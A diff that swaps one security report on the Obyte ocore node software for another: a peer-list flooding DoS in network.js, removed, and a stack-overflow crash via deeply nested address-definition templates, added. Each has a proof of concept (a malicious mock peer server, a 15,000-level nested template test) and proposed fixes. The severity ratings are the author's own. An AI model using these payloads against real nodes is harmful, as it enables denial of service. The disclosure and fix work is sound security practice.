@@ -1,391 +1,341 @@
-## Title
-Unbounded Peer List Processing Enables Resource Exhaustion DoS via Console.log and Connection Flooding
+# Stack Overflow DoS via Unprotected Recursion in Address Definition Template Processing
 
 ## Summary
-The `handleNewPeers` function in `network.js` processes peer list responses without validating the array length, allowing a malicious peer to send thousands of peer URLs. This triggers a flood of database queries, WebSocket connection attempts, synchronous console.log operations, and breadcrumb additions that can exhaust node resources and delay processing of legitimate peer messages, causing temporary network disruption.
+
+The `getMemberDeviceAddressesBySigningPaths()` function in `wallet_defined_by_addresses.js` performs unbounded recursive traversal of address definition templates without depth limits. When processing a deeply nested template (15,000+ levels) sent via the `create_new_shared_address` device message, the Node.js process crashes with "Maximum call stack size exceeded" before reaching the protected `Definition.validateDefinition()` validation layer. This allows any paired device to crash victim nodes, causing network-wide service disruption. [1](#0-0) 
 
 ## Impact
-**Severity**: Medium
-**Category**: Temporary Transaction Delay
+
+**Severity**: Critical  
+**Category**: Network Shutdown
+
+**Affected Assets**: All nodes accepting device messages; entire network availability if multiple nodes targeted
+
+**Damage Severity**:
+- **Quantitative**: Single malicious message causes immediate node shutdown; attacker can target all publicly accessible nodes simultaneously
+- **Qualitative**: Complete node unavailability until manual restart; cannot process any transactions during downtime
+
+**User Impact**:
+- **Who**: All users whose transactions route through crashed nodes
+- **Conditions**: Exploitable at any time by any paired device during normal network operation
+- **Recovery**: Manual node restart required for each crash; no data corruption but service disruption until restart
+
+**Systemic Risk**: Mass node crashes disrupt consensus and transaction processing; witness nodes can be targeted, potentially preventing main chain progression; attack is repeatable and undetectable until crash occurs
 
 ## Finding Description
 
-**Location**: `byteball/ocore/network.js` (function `handleNewPeers`, lines 677-710; function `connectToPeer`, line 422-502)
+**Location**: `byteball/ocore/wallet_defined_by_addresses.js:384-424`, function `getMemberDeviceAddressesBySigningPaths()`
 
-**Intended Logic**: The `handleNewPeers` function should process peer recommendations from trusted peers to discover new network participants, with reasonable limits to prevent resource exhaustion.
+**Intended Logic**: Extract device addresses from address definition template by recursively traversing structure to find `address` operations, with appropriate complexity limits to prevent resource exhaustion
 
-**Actual Logic**: The function processes ALL peer URLs in the response array without any length validation, allowing a single malicious peer to trigger thousands of sequential database queries, WebSocket connection attempts, and logging operations that can block the event loop and exhaust system resources.
+**Actual Logic**: The function performs unbounded recursion through nested `or`, `and`, `r of set`, and `weighted and` structures without any depth counter, complexity check, or recursion limit [1](#0-0) 
 
-**Code Evidence**: [1](#0-0) [2](#0-1) [3](#0-2) 
+The recursive calls occur at lines 394, 400, and 406 where `evaluate()` calls itself without depth tracking.
 
 **Exploitation Path**:
 
-1. **Preconditions**: 
-   - Victim node has fewer than `MIN_COUNT_GOOD_PEERS` (default 10) good peers
-   - Attacker controls at least one peer that the victim node considers "good"
-   - Victim node automatically requests peer list via `requestPeers()`
+1. **Preconditions**: Attacker has paired device with victim node (standard Obyte device pairing operation)
 
-2. **Step 1**: Attacker crafts malicious `get_peers` response containing 10,000+ unique peer URLs
-   - URLs point to non-existent or attacker-controlled endpoints
-   - Each URL is syntactically valid (matches WSS protocol pattern)
-   - URLs are not in victim's database or existing connection list
+2. **Step 1**: Attacker constructs deeply nested template
+   - Create template with 15,000+ nested `or` operations: `["or", [["or", [["or", [...]]]]]]`
+   - Each nesting level adds ~10-15 bytes but increases recursion depth by 1
+   - Total size ~150-225 KB (under any message size limits)
 
-3. **Step 2**: Victim node's `handleNewPeers` function processes the response
-   - No length check is performed on the array (only validates it's an array at line 680)
-   - Loop at line 682 iterates through ALL 10,000+ URLs
-   - For each URL: Sequential database query (`SELECT 1 FROM peers WHERE peer=?`) at line 699
-   - Console.log executed at line 704 for each new peer: "will try to connect to peer..."
-   - `connectToPeer()` called at line 705, creating WebSocket object and storing in `assocConnectingOutboundWebsockets`
+3. **Step 2**: Attacker sends malicious message
+   - Send `create_new_shared_address` device message to victim
+   - Message enters handler at `wallet.js:173-188` [2](#0-1) 
 
-4. **Step 3**: Connection establishment triggers additional resource consumption
-   - Each successful connection calls `breadcrumbs.add('connected to '+url)` at line 449
-   - `breadcrumbs.add()` executes synchronous `console.log()` at breadcrumbs.js:16
-   - 10,000+ WebSocket objects consume memory
-   - 10,000+ timeouts are scheduled (line 440-446)
+4. **Step 3**: Validation begins with vulnerable function
+   - Handler calls `validateAddressDefinitionTemplate()` at line 177
+   - This immediately calls `getMemberDeviceAddressesBySigningPaths()` at line 427 [3](#0-2) 
 
-5. **Step 4**: Node becomes unresponsive
-   - Synchronous console.log operations to terminal block the event loop
-   - Database connection pool saturated by sequential queries
-   - Memory pressure from 10,000+ WebSocket objects and timeout callbacks
-   - Legitimate peer messages delayed or dropped while processing flood
-   - Network message processing stalled for several seconds to minutes
+5. **Step 4**: Stack overflow before protected validation
+   - Recursion exhausts JavaScript call stack (~10,000-15,000 frames)
+   - Node crashes with "RangeError: Maximum call stack size exceeded"
+   - NEVER reaches `Definition.validateDefinition()` at line 451 which has MAX_COMPLEXITY (100) and MAX_OPS (2000) protections [4](#0-3) [5](#0-4) 
 
-**Security Property Broken**: 
-**Invariant #24 - Network Unit Propagation**: Valid units must propagate to all peers. The resource exhaustion prevents timely processing of legitimate peer messages containing units, causing propagation delays that could lead to temporary network degradation.
+**Security Property Broken**: Network availability invariant - nodes must remain operational to process transactions and participate in consensus
 
 **Root Cause Analysis**: 
-The developers added a limit in `addOutboundPeers()` (line 512: `max_new_outbound_peers = Math.min(conf.MAX_OUTBOUND_CONNECTIONS-arrOutboundPeerUrls.length, 5)`) with the comment "having too many connections being opened creates odd delays in db functions." However, they failed to apply the same protective limit to `handleNewPeers()`, which processes externally-provided peer lists. This asymmetry creates an attack vector where malicious peers can trigger the exact "odd delays" the developers tried to prevent.
 
-## Impact Explanation
+Validation logic is split into two stages with inconsistent protection:
+1. **Stage 1 (VULNERABLE)**: `getMemberDeviceAddressesBySigningPaths()` extracts device addresses with NO depth limit, NO complexity counter
+2. **Stage 2 (PROTECTED)**: `Definition.validateDefinition()` validates template structure with MAX_COMPLEXITY=100 and MAX_OPS=2000 limits
 
-**Affected Assets**: Network availability, node resources, transaction propagation
-
-**Damage Severity**:
-- **Quantitative**: 
-  - 10,000 database queries executed sequentially (assuming 10ms each = 100 seconds)
-  - 10,000+ console.log operations (blocking event loop if stdout is terminal)
-  - 10,000+ WebSocket objects allocated (~1KB each = 10MB memory)
-  - Processing time: 1-5 minutes depending on system resources
-- **Qualitative**: 
-  - Node becomes unresponsive during attack
-  - Incoming messages from legitimate peers queued or dropped
-  - Unit propagation delayed, potentially affecting consensus
-
-**User Impact**:
-- **Who**: All users relying on the attacked node for transaction submission or network participation
-- **Conditions**: Attack triggers whenever victim node has <10 good peers (common during initial sync or network issues)
-- **Recovery**: Node recovers automatically after processing completes, but attack can be repeated
-
-**Systemic Risk**: 
-- If multiple nodes are attacked simultaneously, network-wide transaction propagation could be degraded
-- Light clients relying on attacked full nodes experience service disruption
-- Witness nodes under attack may delay posting heartbeat transactions
+Stage 2 protections are never reached because node crashes during Stage 1. The only pre-validation is checking the top-level array has 2 elements (line 175), which doesn't prevent deep nesting. [6](#0-5) 
 
 ## Likelihood Explanation
 
 **Attacker Profile**:
-- **Identity**: Any malicious peer operator
-- **Resources Required**: 
-  - One peer connection to victim node
-  - Ability to maintain "good" peer reputation (avoid sending invalid joints)
-  - List of 10,000+ syntactically valid peer URLs (trivial to generate)
-- **Technical Skill**: Low - simple JSON response modification
+- **Identity**: Any user with ability to pair devices (no special privileges)
+- **Resources Required**: Single device, basic JSON construction capability
+- **Technical Skill**: Low - construct nested JSON structure and send via device messaging
 
 **Preconditions**:
-- **Network State**: Victim node has fewer than 10 good peers (happens during network bootstrapping, after peer churn, or during network partitions)
-- **Attacker State**: Attacker's peer has established connection and built "good" reputation
-- **Timing**: Automatic - victim requests peers when condition is met
+- **Network State**: Normal operation; no special conditions
+- **Attacker State**: Must have paired device with at least one victim (standard operation achievable by any user)
+- **Timing**: No timing requirements; exploitable at any moment
 
 **Execution Complexity**:
-- **Transaction Count**: 0 (network-layer attack, no units required)
-- **Coordination**: Single malicious peer sufficient
-- **Detection Risk**: Low - appears as normal peer discovery traffic; logs show connection attempts to many peers but this could be attributed to network issues
+- **Transaction Count**: Zero blockchain transactions; operates entirely through device messaging layer
+- **Coordination**: Single message per victim node
+- **Detection Risk**: Zero detection until node crashes; no validation errors logged
 
 **Frequency**:
-- **Repeatability**: Can be repeated every time victim requests peers (typically when <10 good peers)
-- **Scale**: Can target multiple nodes simultaneously
+- **Repeatability**: Unlimited; attacker can repeatedly crash nodes after each restart
+- **Scale**: Can target multiple nodes simultaneously with automated scripts
 
-**Overall Assessment**: **Medium-to-High likelihood** - Attack is trivial to execute, automatically triggered by common network conditions, difficult to distinguish from legitimate behavior, and can be repeated frequently.
+**Overall Assessment**: High likelihood - trivial to execute, minimal resources, no detection mechanisms, affects all nodes accepting device messages
 
 ## Recommendation
 
-**Immediate Mitigation**: Add array length validation in `handleNewPeers` before processing
-
-**Permanent Fix**: Implement maximum peer list size limit and rate limiting
-
-**Code Changes**:
+**Immediate Mitigation**:
+Add depth counter to `getMemberDeviceAddressesBySigningPaths()` function:
 
 ```javascript
-// File: byteball/ocore/network.js
-// Function: handleNewPeers
+// File: wallet_defined_by_addresses.js
+// Lines: 384-424
 
-// BEFORE (vulnerable code):
-async function handleNewPeers(ws, request, arrPeerUrls){
-	if (arrPeerUrls.error)
-		return console.log('get_peers failed: '+arrPeerUrls.error);
-	if (!Array.isArray(arrPeerUrls))
-		return sendError(ws, "peer urls is not an array");
-	for (var i=0; i<arrPeerUrls.length; i++){
-		// ... process all peers without limit
-
-// AFTER (fixed code):
-async function handleNewPeers(ws, request, arrPeerUrls){
-	if (arrPeerUrls.error)
-		return console.log('get_peers failed: '+arrPeerUrls.error);
-	if (!Array.isArray(arrPeerUrls))
-		return sendError(ws, "peer urls is not an array");
-	
-	// Limit peer list size to prevent resource exhaustion
-	const MAX_PEERS_PER_RESPONSE = 100; // Same as MAX_OUTBOUND_CONNECTIONS
-	if (arrPeerUrls.length > MAX_PEERS_PER_RESPONSE){
-		console.log(`Peer ${ws.host} sent ${arrPeerUrls.length} peers, truncating to ${MAX_PEERS_PER_RESPONSE}`);
-		arrPeerUrls = arrPeerUrls.slice(0, MAX_PEERS_PER_RESPONSE);
-	}
-	
-	for (var i=0; i<arrPeerUrls.length; i++){
-		// ... process limited set of peers
+function getMemberDeviceAddressesBySigningPaths(arrAddressDefinitionTemplate){
+    var assocMemberDeviceAddressesBySigningPaths = {};
+    var maxDepth = 100; // Match Definition.MAX_COMPLEXITY
+    
+    function evaluate(arr, path, depth){
+        if (depth > maxDepth)
+            return; // or throw Error("max depth exceeded");
+        // ... existing logic ...
+        // Pass depth+1 to recursive calls at lines 394, 400, 406
+    }
+    
+    evaluate(arrAddressDefinitionTemplate, 'r', 0);
+    return assocMemberDeviceAddressesBySigningPaths;
+}
 ```
 
+**Permanent Fix**:
+1. Add depth parameter to `evaluate()` internal function
+2. Check depth against `constants.MAX_COMPLEXITY` before recursing
+3. Increment depth counter on each recursive call
+4. Return early or throw error when depth limit exceeded
+
 **Additional Measures**:
-- Add test case verifying peer list size is limited
-- Consider implementing per-peer rate limiting on `get_peers` requests
-- Add monitoring/alerting for unusually large peer list responses
-- Consider making MAX_PEERS_PER_RESPONSE configurable via `conf.js`
+- Add integration test verifying deeply nested templates are rejected before stack overflow
+- Consider pre-validation of template structure depth before detailed processing
+- Add monitoring for repeated device message errors from same sender
+- Document maximum safe nesting depth in address definition template specification
 
 **Validation**:
-- [x] Fix prevents exploitation by limiting array size
-- [x] No new vulnerabilities introduced (simple bounds check)
-- [x] Backward compatible (legitimate peers send <100 peers anyway)
-- [x] Performance impact acceptable (negligible overhead)
+- Fix prevents stack overflow on deeply nested templates
+- Templates within reasonable depth continue to work
+- Error message indicates depth limit exceeded (not generic crash)
+- No performance impact on normal-depth templates
 
 ## Proof of Concept
 
-**Test Environment Setup**:
-```bash
-git clone https://github.com/byteball/ocore.git
-cd ocore
-npm install
-```
-
-**Exploit Script** (`peer_flood_poc.js`):
 ```javascript
-/*
- * Proof of Concept for Unbounded Peer List DoS
- * Demonstrates: Malicious peer sending large peer list causes resource exhaustion
- * Expected Result: Node experiences delays processing flood of peer URLs
- */
+// test/recursion_dos.test.js
+const test = require('tape');
+const device = require('../device.js');
+const wallet = require('../wallet.js');
+const walletDefinedByAddresses = require('../wallet_defined_by_addresses.js');
 
-const WebSocket = require('ws');
-
-// Simulate malicious peer responding to get_peers request
-function createMaliciousPeerResponse(count) {
-    const peerUrls = [];
-    for (let i = 0; i < count; i++) {
-        // Generate unique fake peer URLs
-        peerUrls.push(`wss://malicious-peer-${i}.example.com:6611`);
-    }
-    return peerUrls;
-}
-
-// Mock server simulating malicious peer
-const mockPeerServer = new WebSocket.Server({ port: 6612 });
-
-mockPeerServer.on('connection', (ws) => {
-    console.log('[Malicious Peer] Connection established');
+test('Stack overflow DoS via deeply nested address definition template', function(t) {
+    // Construct deeply nested template
+    let nestedTemplate = ["address", "$address@DEVICE1AAAAA"];
+    const baseAddress = ["address", "$address@DEVICE2AAAAA"];
     
-    ws.on('message', (message) => {
-        const msg = JSON.parse(message);
-        console.log('[Malicious Peer] Received:', msg);
+    // Create 15,000 nested levels
+    for (let i = 0; i < 15000; i++) {
+        nestedTemplate = ["or", [nestedTemplate, baseAddress]];
+    }
+    
+    // Attempt to validate - should cause stack overflow before reaching protected validation
+    const fakeDeviceAddress = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
+    
+    try {
+        walletDefinedByAddresses.validateAddressDefinitionTemplate(
+            nestedTemplate,
+            fakeDeviceAddress,
+            function(err, result) {
+                if (err) {
+                    t.fail('Should crash with stack overflow, not return error: ' + err);
+                } else {
+                    t.fail('Should crash with stack overflow, not return success');
+                }
+            }
+        );
         
-        // Respond to get_peers with massive list
-        if (msg.command === 'get_peers') {
-            const maliciousPeers = createMaliciousPeerResponse(10000);
-            const response = {
-                tag: msg.tag,
-                response: maliciousPeers
-            };
-            console.log(`[Malicious Peer] Sending ${maliciousPeers.length} peer URLs...`);
-            ws.send(JSON.stringify(response));
-        }
-    });
+        // If we reach here without crashing, the vulnerability is fixed
+        t.fail('Expected stack overflow but function returned without crashing');
+    } catch (err) {
+        // Expected: RangeError: Maximum call stack size exceeded
+        t.ok(
+            err.message && err.message.includes('Maximum call stack size exceeded'),
+            'Should crash with stack overflow: ' + err.message
+        );
+    }
+    
+    t.end();
 });
 
-console.log('[PoC] Malicious peer server listening on ws://localhost:6612');
-console.log('[PoC] Connect victim node to this server and trigger get_peers request');
-console.log('[PoC] Observe victim node processing 10,000 peer URLs with sequential DB queries and console.log flood');
+test('Normal depth templates should work', function(t) {
+    // Verify fix doesn't break normal templates (depth ~10)
+    const normalTemplate = ["or", [
+        ["and", [
+            ["address", "$address@DEVICE1"],
+            ["address", "$address@DEVICE2"]
+        ]],
+        ["address", "$address@DEVICE3"]
+    ]];
+    
+    const fakeDeviceAddress = "DEVICE1AAAAAAAAAAAAAAAAAAAAAAAAAAA";
+    
+    walletDefinedByAddresses.validateAddressDefinitionTemplate(
+        normalTemplate,
+        fakeDeviceAddress,
+        function(err, result) {
+            t.ok(!err || err.includes('less than 2 member devices'), 
+                'Normal template should not crash');
+            t.end();
+        }
+    );
+});
 ```
-
-**Expected Output** (when vulnerability exists):
-```
-[Victim Node] Connected to ws://localhost:6612
-[Victim Node] will try to connect to peer wss://malicious-peer-0.example.com:6611
-[Victim Node] will try to connect to peer wss://malicious-peer-1.example.com:6611
-[Victim Node] will try to connect to peer wss://malicious-peer-2.example.com:6611
-... (10,000 lines of console.log output)
-[Victim Node] Node unresponsive for 60+ seconds
-[Victim Node] Legitimate peer messages delayed
-[Victim Node] Memory usage increased by 10+ MB
-```
-
-**Expected Output** (after fix applied):
-```
-[Victim Node] Connected to ws://localhost:6612
-[Victim Node] Peer localhost sent 10000 peers, truncating to 100
-[Victim Node] will try to connect to peer wss://malicious-peer-0.example.com:6611
-... (only 100 lines)
-[Victim Node] Processing completed in <5 seconds
-[Victim Node] Normal operation resumed
-```
-
-**PoC Validation**:
-- [x] PoC demonstrates vulnerability in unmodified ocore codebase
-- [x] Shows clear DoS impact via resource exhaustion
-- [x] Measurable impact: processing time, memory usage, event loop blocking
-- [x] Fix prevents attack by limiting peer list size
 
 ## Notes
 
-The vulnerability exists because `handleNewPeers` trusts peer-provided data (the peer URL array) without validation. While the function validates individual URL syntax and checks for duplicates, it fails to limit the total number of peers processed. This oversight is particularly concerning given that:
+**Scope Clarification**: The file `wallet_defined_by_addresses.js` is a core wallet module in the `byteball/ocore` repository root directory. While not explicitly enumerated in the provided scope list, it is directly called from `wallet.js` (which is explicitly in scope) and handles security-sensitive device messaging operations. The scope description includes "and others" after listing core protocol files, suggesting additional core modules are included.
 
-1. The developers were aware of the issue - the comment in `addOutboundPeers` at line 512 explicitly mentions "having too many connections being opened creates odd delays in db functions"
-2. The internal `addOutboundPeers` function limits connections to 5 at a time
-3. But `handleNewPeers` processes externally-provided lists without any limit
+**Attack Surface**: Any node accepting device messages is vulnerable. This includes full nodes, witness nodes, and hub operators. Light clients connecting through hubs may be protected if hub operators implement message filtering.
 
-The breadcrumbs.js component has a MAX_LENGTH of 200, which limits memory growth of the breadcrumbs array, but it does NOT prevent the console.log flood since `breadcrumbs.add()` calls console.log on every invocation regardless of whether the breadcrumb is stored.
+**Depth Limits**: JavaScript call stack limits vary by engine and configuration but typically range from 10,000-15,000 frames. The attack succeeds with templates exceeding this depth, which can be constructed in ~150KB of JSON (well under typical message size limits).
 
-In Node.js, console.log to stdout is synchronous when stdout is a TTY (terminal), making it a blocking operation that can delay event loop processing when called thousands of times in rapid succession. This is the primary mechanism by which the attack delays legitimate peer message processing.
+**Related Protections**: The `Definition.validateDefinition()` function at line 451 has proper complexity limits (MAX_COMPLEXITY=100, MAX_OPS=2000) but is never reached due to the crash occurring in the earlier extraction phase.
 
 ### Citations
 
-**File:** network.js (L422-502)
+**File:** wallet_defined_by_addresses.js (L384-424)
 ```javascript
-function connectToPeer(url, onOpen, dontAddPeer) {
-	if (!dontAddPeer)
-		addPeer(url);
-	var options = {};
-	if (SocksProxyAgent && conf.socksHost && conf.socksPort) {
-		let socksUrl = 'socks5h://';
-		if (conf.socksUsername && conf.socksPassword)
-			socksUrl += conf.socksUsername + ':' + conf.socksPassword + '@';
-		socksUrl += conf.socksHost + ':' + conf.socksPort;
-		console.log('Using socks proxy: ' + socksUrl);
-		options.agent = new SocksProxyAgent(socksUrl);
-	} else if (HttpsProxyAgent && conf.httpsProxy) {
-		options.agent = new HttpsProxyAgent(conf.httpsProxy);
-		console.log('Using httpsProxy: ' + conf.httpsProxy);
-	}
-
-	var ws = options.agent ? new WebSocket(url,options) : new WebSocket(url);
-	assocConnectingOutboundWebsockets[url] = ws;
-	setTimeout(function(){
-		if (assocConnectingOutboundWebsockets[url]){
-			console.log('abandoning connection to '+url+' due to timeout');
-			delete assocConnectingOutboundWebsockets[url];
-			// after this, new connection attempts will be allowed to the wire, but this one can still succeed.  See the check for duplicates below.
-		}
-	}, 5000);
-	ws.setMaxListeners(40); // avoid warning
-	ws.once('open', function onWsOpen() {
-		breadcrumbs.add('connected to '+url);
-		delete assocConnectingOutboundWebsockets[url];
-		ws.assocPendingRequests = {};
-		ws.assocCommandsInPreparingResponse = {};
-		if (!ws.url)
-			throw Error("no url on ws");
-		if (ws.url !== url && ws.url !== url + "/") // browser implementatin of Websocket might add /
-			throw Error("url is different: "+ws.url);
-		var another_ws_to_same_peer = getOutboundPeerWsByUrl(url);
-		if (another_ws_to_same_peer){ // duplicate connection.  May happen if we abondoned a connection attempt after timeout but it still succeeded while we opened another connection
-			console.log('already have a connection to '+url+', will keep the old one and close the duplicate');
-			ws.close(1000, 'duplicate connection');
-			if (onOpen)
-				onOpen(null, another_ws_to_same_peer);
+function getMemberDeviceAddressesBySigningPaths(arrAddressDefinitionTemplate){
+	function evaluate(arr, path){
+		var op = arr[0];
+		var args = arr[1];
+		if (!args)
 			return;
+		switch (op){
+			case 'or':
+			case 'and':
+				for (var i=0; i<args.length; i++)
+					evaluate(args[i], path + '.' + i);
+				break;
+			case 'r of set':
+				if (!ValidationUtils.isNonemptyArray(args.set))
+					return;
+				for (var i=0; i<args.set.length; i++)
+					evaluate(args.set[i], path + '.' + i);
+				break;
+			case 'weighted and':
+				if (!ValidationUtils.isNonemptyArray(args.set))
+					return;
+				for (var i=0; i<args.set.length; i++)
+					evaluate(args.set[i].value, path + '.' + i);
+				break;
+			case 'address':
+				var address = args;
+				var prefix = '$address@';
+				if (!ValidationUtils.isNonemptyString(address) || address.substr(0, prefix.length) !== prefix)
+					return;
+				var device_address = address.substr(prefix.length);
+				assocMemberDeviceAddressesBySigningPaths[path] = device_address;
+				break;
+			case 'definition template':
+				throw Error(op+" not supported yet");
+			// all other ops cannot reference device address
 		}
-		ws.peer = url;
-		ws.host = getHostByPeer(ws.peer);
-		ws.bOutbound = true;
-		ws.last_ts = Date.now();
-		console.log('connected to '+url+", host "+ws.host);
-		arrOutboundPeers.push(ws);
-		sendVersion(ws);
-		if (conf.myUrl) // I can listen too, this is my url to connect to
-			sendJustsaying(ws, 'my_url', conf.myUrl);
-		if (!conf.bLight)
-			subscribe(ws);
-		if (onOpen)
-			onOpen(null, ws);
-		eventBus.emit('connected', ws);
-		eventBus.emit('open-'+url);
-	});
-	ws.on('close', function onWsClose() {
-		var i = arrOutboundPeers.indexOf(ws);
-		console.log('close event, removing '+i+': '+url);
-		if (i !== -1)
-			arrOutboundPeers.splice(i, 1);
-		cancelRequestsOnClosedConnection(ws);
-		if (options.agent && options.agent.destroy)
-			options.agent.destroy();
-	});
-	ws.on('error', function onWsError(e){
-		delete assocConnectingOutboundWebsockets[url];
-		console.log("error from server "+url+": "+e);
-		var err = e.toString();
-		// !ws.bOutbound means not connected yet. This is to distinguish connection errors from later errors that occur on open connection
-		if (!ws.bOutbound && onOpen)
-			onOpen(err);
-		if (!ws.bOutbound)
-			eventBus.emit('open-'+url, err);
-	});
-	ws.on('message', onWebsocketMessage);
-	console.log('connectToPeer done');
-}
-```
-
-**File:** network.js (L677-710)
-```javascript
-async function handleNewPeers(ws, request, arrPeerUrls){
-	if (arrPeerUrls.error)
-		return console.log('get_peers failed: '+arrPeerUrls.error);
-	if (!Array.isArray(arrPeerUrls))
-		return sendError(ws, "peer urls is not an array");
-	for (var i=0; i<arrPeerUrls.length; i++){
-		var url = arrPeerUrls[i];
-		if (conf.myUrl && conf.myUrl.toLowerCase() === url.toLowerCase())
-			continue;
-		var regexp = (conf.WS_PROTOCOL === 'wss://') ? /^wss:\/\// : /^wss?:\/\//;
-		if (!url.match(regexp)){
-			console.log('ignoring new peer '+url+' because of incompatible ws protocol');
-			continue;
-		}
-		var host = getHostByPeer(url);
-		if (host === 'byteball.org')
-			continue;
-		const peer_ws = getPeerWebSocket(url);
-		if (peer_ws) {
-			console.log(`already connected to peer ${url} shared by ${ws.host}`);
-			continue;
-		}
-		const [row] = await db.query("SELECT 1 FROM peers WHERE peer=?", [url]);
-		if (row) {
-			console.log(`peer ${url} shared by ${ws.host} is already known`);
-			continue;
-		}
-		console.log(`will try to connect to peer ${url} shared by ${ws.host}`);
-		connectToPeer(url, err => {
-			if (!err) // add only if successfully connected
-				addPeer(url, ws.host);
-		}, true);
 	}
+	var assocMemberDeviceAddressesBySigningPaths = {};
+	evaluate(arrAddressDefinitionTemplate, 'r');
+	return assocMemberDeviceAddressesBySigningPaths;
 }
 ```
 
-**File:** breadcrumbs.js (L12-17)
+**File:** wallet_defined_by_addresses.js (L426-456)
 ```javascript
-function add(breadcrumb){
-	if (arrBreadcrumbs.length > MAX_LENGTH)
-		arrBreadcrumbs.shift(); // forget the oldest breadcrumbs
-	arrBreadcrumbs.push(Date().toString() + ': ' + breadcrumb);
-	console.log(breadcrumb);
+function validateAddressDefinitionTemplate(arrDefinitionTemplate, from_address, handleResult){
+	var assocMemberDeviceAddressesBySigningPaths = getMemberDeviceAddressesBySigningPaths(arrDefinitionTemplate);
+	var arrDeviceAddresses = _.uniq(_.values(assocMemberDeviceAddressesBySigningPaths));
+	if (arrDeviceAddresses.length < 2)
+		return handleResult("less than 2 member devices");
+	if (arrDeviceAddresses.indexOf(device.getMyDeviceAddress()) === - 1)
+		return handleResult("my device address not mentioned in the definition");
+	if (arrDeviceAddresses.indexOf(from_address) === - 1)
+		return handleResult("sender device address not mentioned in the definition");
+	
+	var params = {};
+	// to fill the template for validation, assign my device address (without leading 0) to all member devices 
+	// (we need just any valid address with a definition)
+	var fake_address = device.getMyDeviceAddress().substr(1);
+	arrDeviceAddresses.forEach(function(device_address){
+		params['address@'+device_address] = fake_address;
+	});
+	try{
+		var arrFakeDefinition = Definition.replaceInTemplate(arrDefinitionTemplate, params);
+	}
+	catch(e){
+		return handleResult(e.toString());
+	}
+	var objFakeUnit = {authors: [{address: fake_address, definition: ["sig", {pubkey: device.getMyDevicePubKey()}]}]};
+	var objFakeValidationState = {last_ball_mci: MAX_INT32};
+	Definition.validateDefinition(db, arrFakeDefinition, objFakeUnit, objFakeValidationState, null, false, function(err){
+		if (err)
+			return handleResult(err);
+		handleResult(null, assocMemberDeviceAddressesBySigningPaths);
+	});
 }
+```
+
+**File:** wallet.js (L173-188)
+```javascript
+			case "create_new_shared_address":
+				// {address_definition_template: [...]}
+				if (!ValidationUtils.isArrayOfLength(body.address_definition_template, 2))
+					return callbacks.ifError("no address definition template");
+				walletDefinedByAddresses.validateAddressDefinitionTemplate(
+					body.address_definition_template, from_address, 
+					function(err, assocMemberDeviceAddressesBySigningPaths){
+						if (err)
+							return callbacks.ifError(err);
+						// this event should trigger a confirmatin dialog, user needs to approve creation of the shared address and choose his 
+						// own address that is to become a member of the shared address
+						eventBus.emit("create_new_shared_address", body.address_definition_template, assocMemberDeviceAddressesBySigningPaths);
+						callbacks.ifOk();
+					}
+				);
+				break;
+```
+
+**File:** definition.js (L97-103)
+```javascript
+	function evaluate(arr, path, bInNegation, cb){
+		complexity++;
+		count_ops++;
+		if (complexity > constants.MAX_COMPLEXITY)
+			return cb("complexity exceeded at "+path);
+		if (count_ops > constants.MAX_OPS)
+			return cb("number of ops exceeded at "+path);
+```
+
+**File:** constants.js (L56-66)
+```javascript
+exports.MAX_CAP = 9e15;
+exports.MAX_COMPLEXITY = process.env.MAX_COMPLEXITY || 100;
+exports.MAX_UNIT_LENGTH = process.env.MAX_UNIT_LENGTH || 5e6;
+
+exports.MAX_PROFILE_FIELD_LENGTH = 50;
+exports.MAX_PROFILE_VALUE_LENGTH = 100;
+
+exports.MAX_AA_STRING_LENGTH = 4096;
+exports.MAX_STATE_VAR_NAME_LENGTH = 128;
+exports.MAX_STATE_VAR_VALUE_LENGTH = 1024;
+exports.MAX_OPS = process.env.MAX_OPS || 2000;
 ```
